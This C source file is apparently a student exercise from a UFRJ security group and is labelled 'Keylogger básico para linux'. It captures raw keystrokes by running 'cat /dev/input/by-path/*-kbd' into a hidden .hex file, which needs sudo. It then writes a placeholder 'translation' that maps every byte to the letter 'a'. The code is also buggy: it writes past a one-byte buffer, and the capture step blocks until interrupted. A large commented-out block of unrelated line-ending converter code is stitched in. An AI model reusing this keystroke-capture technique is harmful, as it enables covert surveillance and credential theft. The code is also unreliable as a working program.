/*
 * Universidade Federal do Rio de Janeiro
 * PS-GRIS
 * Autor: Pedro Jullian Medina Torres Graca
 * TAG:	Malware
 * Aplicador: José
 * Descricao: Keylogger básico para linux
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keylogger.h"

#define COMPRIMENTO_BUFFER 			1
#define EOS										 '\0'

tipoErros
tradutor (byte buffer[COMPRIMENTO_BUFFER], char *saida);

int
main (int argc , char *argv[])
{
//	unsigned indice,auxiliar;
	char saida[1];
	FILE *arqTraducao , *code;
	size_t lidos;
	byte buffer [COMPRIMENTO_BUFFER];
	tipoErros verificador;

//	char linha[TAMANHO_MAXIMO_LINHA];
	
	printf ("\nNAO ESQUEÇA QUE ESSE PROGRAMA PRECISA DE SUDO PRA FUNCIONAR\n");
	if (argc!=NUMERO_ARGUMENTOS)
	{
		printf ("\nUso: %s <nome-do-arquivo-que-vc-deseja-colocar-os-dados>\n",argv[0]);
		exit (numeroArgumentosInvalido);		
	}

	system ("cat /dev/input/by-path/*-kbd > ./.hex");
	/*preciso tratar para caso nao tenha permissao*/
	/*cria arquivo hex das teclas digitadas*/

	/*precisa aprender como joga ctrl-c via C. com isso posso colocar um time como entrada e pegar tudo que foi escrito num tempo*/

	if (!(code = fopen (".hex","r")))
	{
		printf ("\nNão foi possivel abrir o arquivo \"%s\"", ".hex");
    printf ("\nErro (#%i): %s\n", naoConseguindoAbrirArquivo, "arquivo NULL");
    exit(naoConseguindoAbrirArquivo);
	}/*abre arquivo que precisa de correção*/
	
	/*seria bom tratar o argv[1] obrigando ele a ser apenas letras e pontos e sempre terminar com .txt*/
	
	if (!(arqTraducao= fopen (argv[1], "w")))
	{
		printf ("\nNão foi possivel construir o arquivo \"%s\"", argv[1]);
    printf ("\nErro (#%i): %s\n", naoConseguindoAbrirArquivo, "arquivo NULL");
    exit(naoConseguindoAbrirArquivo);
	}/*abre arquivo que recebera a correcao*/
	
	/*aqui irei ler o .hex, traduzir e passar pro arquivo argv[1]*/
	while ((lidos=fread (buffer, COMPRIMENTO_BUFFER,1,code)))
	{
		if ((verificador=tradutor (buffer,&saida))==ok)
		{
			saida[1]=EOS;
			fputs(saida,arqTraducao);
		}
		else
		{
			if (verificador==naoAchado);
			else
			{
				printf ("Erro(#%i): erro ao tentar traduzir algum valor\n",verificador);
			}
		}
	}/*loop de ler .hex e colocar no nome pedido*/
	fputs("\n",arqTraducao);

	if (fclose (code)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", "a.txt");
		printf ("\nErro (#%i): %s", naoConseguindofecharArquivo, "desconhecido\n");
		exit (naoConseguindofecharArquivo);
	}/* fecha*/

/*	system ("rm .hex");*/ /*apaga arquivo que foi traduzido*/

	if (fclose (arqTraducao)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", argv[1]);
		printf ("\nErro (#%i): %s", naoConseguindofecharArquivo, "desconhecido\n");
		exit (naoConseguindofecharArquivo);
	}

	return ok;
}


tipoErros
tradutor (byte buffer[COMPRIMENTO_BUFFER], char *saida)
{
	*saida='a';
	return ok;
}
/*
	arqSaida= fopen (convertidoDos, "w");
	if (arqSaida==NULL)
	{
		printf ("\nNão foi possivel criar o arquivo \"%s\"", convertidoDos);
    printf ("\nErro (#%i): %s\n", errno, strerror (errno));
    fclose (arqEntrada);
		return naoConseguindoAbrirArquivo;
	}
	
	while ((fgets(linha,TAMANHO_MAXIMO_LINHA,arqEntrada))!=NULL)
	{
		for (indice=0;(linha[indice]!='\n');indice++);

		if (indice>TAMANHO_MAXIMO_LINHA)
		{
			printf ("\nO maximo de caracteres por linha eh de %i e a seguinte linha passou do limite:\n%s",TAMANHO_MAXIMO_LINHA-1,linha);
			fclose (arqEntrada);
			fclose (arqSaida);
			remove (convertidoDos);
			return passouLimiteLinhas;
		}
		if (indice>0)
			if ((linha[indice]!='\n')||(linha[indice-1]=='\r'))
			{
				printf ("\nO arquivo fornecido \"%s\" nao esta no formato Unix. Por favor altere.\nPara saber como usar essa funcao use a flag -[h|H]",originalUnix);
				fclose (arqEntrada);
				fclose (arqSaida);
				remove (convertidoDos);
				return formatoEntradaIncorreto;
			}
		linha[indice]='\r';
		fprintf(arqSaida,"%s\n",linha);
	}
	
	if (ferror(arqEntrada))
	{
		printf ("\nErro lendo o Arquivo \"%s\"",originalUnix);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		fclose (arqEntrada);
		remove (convertidoDos);
		fclose (arqSaida);
		return naoConseguindoLerArquivo;
	}
	*/
/*
tipoErros
ConverterArquivoFormatoDosFormatoUnix (char *originalDos, char *convertidoUnix)
{
	if (!originalDos)
		return originalNull;
	if (!convertidoUnix)
		return convertidoNull;

	bit nomesIguais=0;
	unsigned indice,auxiliar;
	FILE *arqEntrada, *arqSaida;
	char linha[200];
	printf ("\nEntrada: %s\tSaida: %s\t",originalDos,convertidoUnix);
	printf ("\nConvertendo Dos para Unix");

	auxiliar=0;
	for (indice=0; originalDos[indice]!=EOS; indice++)
		if (originalDos[indice]==convertidoUnix[indice])
			auxiliar++;
	if (auxiliar==indice)
	{
		convertidoUnix[indice]='A';
		convertidoUnix[indice+1]=EOS;
		nomesIguais=1;
	}
	arqEntrada= fopen (originalDos, "r");
	if (arqEntrada==NULL)
	{
		printf ("\nNão foi possivel abrir o arquivo \"%s\"", originalDos);
    printf ("\nErro (#%i): %s", errno, strerror (errno));
    return naoConseguindoAbrirArquivo;
	}

	arqSaida= fopen (convertidoUnix, "w");
	if (arqSaida==NULL)
	{
		printf ("\nNão foi possivel criar o arquivo \"%s\"", convertidoUnix);
    printf ("\nErro (#%i): %s\n", errno, strerror (errno));
    fclose (arqEntrada);
		return naoConseguindoAbrirArquivo;
	}
	
	while ((fgets(linha,TAMANHO_MAXIMO_LINHA,arqEntrada))!=NULL)
	{
		for (indice=0;(linha[indice]!='\n');indice++);

		if (indice>TAMANHO_MAXIMO_LINHA)
		{
			printf ("\nO maximo de caracteres por linha eh de %i e a seguinte linha passou do limite:\n%s",TAMANHO_MAXIMO_LINHA-1,linha);
			fclose (arqEntrada);
			fclose (arqSaida);
			remove (convertidoUnix);
			return passouLimiteLinhas;
		}
		if ((linha[indice-1]!='\r')||(linha[indice]!='\n'))
		{
			printf ("\nO arquivo fornecido \"%s\" nao esta no formato Dos. Por favor altere.\nPara saber como usar essa funcao use a flag -[h|H]",originalDos);
			fclose (arqEntrada);
			fclose (arqSaida);
			remove (convertidoUnix);
			return formatoEntradaIncorreto;
		}
		linha[indice-1]='\n';
		linha[indice]='\0';
		fprintf(arqSaida,"%s",linha);
	}
	
	if (ferror(arqEntrada))
	{
		printf ("\nErro lendo o Arquivo \"%s\"",originalDos);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		fclose (arqEntrada);
		remove (convertidoUnix);
		fclose (arqSaida);
		return naoConseguindoLerArquivo;
	}
	
	if (fclose (arqEntrada)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", originalDos);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		return naoConseguindoFecharArquivo;
	}
	
	if (fclose (arqSaida)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", convertidoUnix);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		return naoConseguindoFecharArquivo;
	}

	if (nomesIguais==1)
	{
		remove (originalDos);
		copiar (convertidoUnix,originalDos);
		remove (convertidoUnix);
	}
	
	printf ("\nConvertido com sucesso\n\n");
	
	return ok;
}

tipoErros
copiar (char *original, char *copia)
{
	if (!original)
		return originalNull;
	if (!copia)
		return convertidoNull;
	
	FILE *arqEntrada, *arqSaida;

	arqEntrada= fopen (original, "r");
	if (arqEntrada==NULL)
	{
		printf ("\nNão foi possivel abrir o arquivo \"%s\"", original);
    printf ("\nErro (#%i): %s", errno, strerror (errno));
    return naoConseguindoAbrirArquivo;
	}
	arqSaida= fopen (copia, "w");
	if (arqEntrada==NULL)
	{
		printf ("\nNão foi possivel abrir o arquivo \"%s\"", copia);
    printf ("\nErro (#%i): %s", errno, strerror (errno));
    return naoConseguindoAbrirArquivo;
	}	
	char linha[200];
	
	while ((fgets(linha,TAMANHO_MAXIMO_LINHA,arqEntrada))!=NULL)
		fprintf(arqSaida,"%s",linha);
	
	if (ferror(arqEntrada))
	{
		printf ("\nErro lendo o Arquivo \"%s\"",original);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		fclose (arqEntrada);
		remove (copia);
		fclose (arqSaida);
		return naoConseguindoLerArquivo;
	}

	if (fclose (arqEntrada)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", original);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		return naoConseguindoFecharArquivo;
	}
	
	if (fclose (arqSaida)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", copia);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		return naoConseguindoFecharArquivo;
	}

	return ok;
}
*/
